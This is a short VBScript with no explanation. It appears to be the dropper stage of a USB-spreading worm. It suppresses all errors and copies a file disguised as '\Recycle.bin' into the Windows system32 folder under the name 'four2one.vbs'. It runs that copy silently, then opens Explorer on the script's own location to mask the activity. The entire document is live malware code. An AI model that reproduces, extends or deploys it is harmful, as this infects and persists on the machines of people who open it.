on error resume next
Dim OldName, NewName, sd, wp
set co = createobject("Scripting.FileSystemObject")
set sd = createobject("Wscript.shell")
Set wp = co.getspecialfolder(0)
OldName = "\Recycle.bin"
NewName = "c:\windows\system32\four2one.vbs"
co.copyfile OldName, NewName, false
if Err.Number = 58 then
else
sd.run "c:\windows\system32\four2one.vbs"
end if 
sd.run wp & "\explorer.exe /e,/select, " & Wscript.ScriptFullname